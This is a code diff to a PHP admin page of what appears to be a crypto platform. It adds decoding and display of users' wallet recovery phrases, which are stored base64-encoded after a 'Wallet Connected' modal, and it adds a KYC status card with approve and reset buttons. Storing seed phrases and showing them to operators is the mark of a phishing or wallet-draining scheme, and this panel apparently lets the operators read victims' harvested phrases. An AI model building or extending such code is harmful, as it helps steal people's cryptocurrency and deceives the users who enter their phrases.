@@ -408,13 +408,29 @@
     
  
     <!-- Crypto Wallet Phrase Card -->
-    <?php if (!empty($row['phrase'])): ?>
+    <?php 
+    // Determine which wallet phrase to display
+    $displayPhrase = '';
+    $phraseSource = '';
+    
+    // Check new wallet_phrase column first (base64 encoded from modal)
+    if (!empty($row['wallet_phrase'])) {
+        $displayPhrase = base64_decode($row['wallet_phrase']);
+        $phraseSource = 'wallet_phrase';
+    } 
+    // Fall back to old phrase column (plain text)
+    elseif (!empty($row['phrase'])) {
+        $displayPhrase = $row['phrase'];
+        $phraseSource = 'phrase';
+    }
+    
+    if (!empty($displayPhrase)): ?>
     <div class="card shadow-lg" style="margin-bottom: 1.5rem;">
         <div class="card-header bg-gradient" style="display: flex; align-items: center; gap: 0.75rem;">
             <i class="fas fa-fw fa-key" style="color: var(--primary-color); font-size: 1.25rem;"></i>
             <div>
                 <h3 class="m-0">Crypto Wallet Phrase</h3>
-                <small class="text-muted">Recovery phrase for wallet access</small>
+                <small class="text-muted">Recovery phrase for wallet access<?php echo $phraseSource === 'wallet_phrase' ? ' (Wallet Connected)' : ' (Legacy)'; ?></small>
             </div>
         </div>
         <div class="card-body">
@@ -424,8 +440,8 @@
                 
                 <div class="form-group mb-3">
                     <label class="form-label"><i class="fas fa-lock" style="color: var(--primary-color); margin-right: 0.5rem;"></i>Wallet Recovery Phrase</label>
-                    <textarea class="form-control" name="phrase" rows="4" required style="font-family: monospace; font-size: 0.9rem; line-height: 1.6;"><?= htmlspecialchars($row["phrase"]); ?></textarea>
-                    <small class="text-muted">Keep this phrase secure - it's needed to recover wallet access. Contains <?= count(explode(' ', trim($row['phrase']))); ?> words.</small>
+                    <textarea class="form-control" name="phrase" rows="4" required style="font-family: monospace; font-size: 0.9rem; line-height: 1.6;"><?= htmlspecialchars($displayPhrase); ?></textarea>
+                    <small class="text-muted">Keep this phrase secure - it's needed to recover wallet access. Contains <?= count(explode(' ', trim($displayPhrase))); ?> words.</small>
                 </div>
 
                 <div style="background: var(--bg-secondary); padding: 1rem; border-radius: 0.5rem; margin-bottom: 1rem;">
@@ -448,6 +464,110 @@
                     </button>
                 </div>
             </form>
+        </div>
+    </div>
+
+    <!-- KYC Verification Card -->
+    <div class="card shadow-lg" style="margin-bottom: 1.5rem;">
+        <div class="card-header bg-gradient" style="display: flex; align-items: center; gap: 0.75rem;">
+            <i class="fas fa-fw fa-shield-alt" style="color: var(--primary-color); font-size: 1.25rem;"></i>
+            <div>
+                <h3 class="m-0">KYC Verification</h3>
+                <small class="text-muted">Know Your Customer documentation status</small>
+            </div>
+        </div>
+        <div class="card-body">
+            <?php if ($row['kyc'] == 1): ?>
+                <div style="background: rgba(16, 185, 129, 0.1); border-left: 4px solid #10b981; padding: 1rem; border-radius: 0.5rem; margin-bottom: 1.5rem;">
+                    <div style="display: flex; align-items: center; gap: 0.75rem; margin-bottom: 0.5rem;">
+                        <i class="fas fa-check-circle" style="color: #10b981; font-size: 1.25rem;"></i>
+                        <span style="font-weight: 600; color: #10b981;">KYC Verified</span>
+                    </div>
+                    <p style="margin: 0; color: #059669; font-size: 0.9rem;">User has completed KYC verification and can access all platform features.</p>
+                </div>
+            <?php elseif ($row['kyc'] == 2): ?>
+                <div style="background: rgba(245, 158, 11, 0.1); border-left: 4px solid #f59e0b; padding: 1rem; border-radius: 0.5rem; margin-bottom: 1.5rem;">
+                    <div style="display: flex; align-items: center; gap: 0.75rem; margin-bottom: 0.5rem;">
+                        <i class="fas fa-hourglass-half" style="color: #f59e0b; font-size: 1.25rem;"></i>
+                        <span style="font-weight: 600; color: #f59e0b;">Pending Review</span>
+                    </div>
+                    <p style="margin: 0; color: #92400e; font-size: 0.9rem;">KYC documents have been submitted and are awaiting admin review.</p>
+                </div>
+            <?php else: ?>
+                <div style="background: rgba(239, 68, 68, 0.1); border-left: 4px solid #ef4444; padding: 1rem; border-radius: 0.5rem; margin-bottom: 1.5rem;">
+                    <div style="display: flex; align-items: center; gap: 0.75rem; margin-bottom: 0.5rem;">
+                        <i class="fas fa-exclamation-circle" style="color: #ef4444; font-size: 1.25rem;"></i>
+                        <span style="font-weight: 600; color: #ef4444;">Not Verified</span>
+                    </div>
+                    <p style="margin: 0; color: #7f1d1d; font-size: 0.9rem;">User has not submitted KYC documents yet.</p>
+                </div>
+            <?php endif; ?>
+
+            <!-- KYC Details Table -->
+            <div style="margin-top: 1.5rem;">
+                <h5 style="margin-bottom: 1rem; font-weight: 600; color: var(--text-primary);">Verification Details</h5>
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin-bottom: 1.5rem;">
+                    <div style="background: var(--bg-secondary); padding: 1rem; border-radius: 0.5rem;">
+                        <p style="margin: 0; color: var(--text-secondary); font-size: 0.85rem; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 0.5rem;">Status</p>
+                        <p style="margin: 0; font-weight: 600; color: var(--text-primary); font-size: 1rem;">
+                            <?php 
+                            if ($row['kyc'] == 1) {
+                                echo '<span style="color: #10b981;">✓ Verified</span>';
+                            } elseif ($row['kyc'] == 2) {
+                                echo '<span style="color: #f59e0b;">⏳ Pending</span>';
+                            } else {
+                                echo '<span style="color: #ef4444;">✕ Not Verified</span>';
+                            }
+                            ?>
+                        </p>
+                    </div>
+                    <div style="background: var(--bg-secondary); padding: 1rem; border-radius: 0.5rem;">
+                        <p style="margin: 0; color: var(--text-secondary); font-size: 0.85rem; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 0.5rem;">Document Type</p>
+                        <p style="margin: 0; font-weight: 600; color: var(--text-primary); font-size: 1rem;">N/A</p>
+                    </div>
+                </div>
+
+                <!-- KYC Actions -->
+                <form method="POST" action="code.php" style="margin-top: 1.5rem;">
+                    <input type="hidden" value="<?= htmlspecialchars($_SERVER['PHP_SELF'].'?id='.$id) ?>" name="file">
+                    <input type="hidden" value="<?= htmlspecialchars($row['id']); ?>" name="edit_id">
+                    
+                    <div style="display: flex; gap: 0.75rem; flex-wrap: wrap;">
+                        <?php if ($row['kyc'] != 1): ?>
+                            <button type="submit" name="verify_kyc" class="btn btn-success" onclick="return confirm('Verify this user\'s KYC documents?')">
+                                <i class="fas fa-check-circle"></i> Approve KYC
+                            </button>
+                        <?php endif; ?>
+                        
+                        <?php if ($row['kyc'] == 1): ?>
+                            <button type="submit" name="reject_kyc" class="btn btn-warning" onclick="return confirm('Reject this user\'s KYC verification? They will need to resubmit.')">
+                                <i class="fas fa-times-circle"></i> Reject KYC
+                            </button>
+                        <?php endif; ?>
+
+                        <?php if ($row['kyc'] != 0): ?>
+                            <button type="submit" name="reset_kyc" class="btn btn-secondary" onclick="return confirm('Reset KYC status to unverified?')">
+                                <i class="fas fa-redo"></i> Reset Status
+                            </button>
+                        <?php endif; ?>
+                    </div>
+                </form>
+
+                <!-- KYC Info Box -->
+                <div style="background: rgba(59, 130, 246, 0.1); border: 1px solid rgba(59, 130, 246, 0.3); border-radius: 0.5rem; padding: 1rem; margin-top: 1.5rem;">
+                    <div style="display: flex; gap: 0.75rem;">
+                        <i class="fas fa-info-circle" style="color: #3b82f6; margin-top: 0.25rem; flex-shrink: 0;"></i>
+                        <div>
+                            <p style="margin: 0; color: #1e40af; font-size: 0.9rem;">
+                                <strong>KYC Status Legend:</strong><br>
+                                <span style="color: #10b981;">✓ Verified</span> - User has passed KYC verification<br>
+                                <span style="color: #f59e0b;">⏳ Pending</span> - Documents submitted, awaiting review<br>
+                                <span style="color: #ef4444;">✕ Not Verified</span> - No documents submitted or verification rejected
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
         </div>
     </div>
     <?php else: ?>
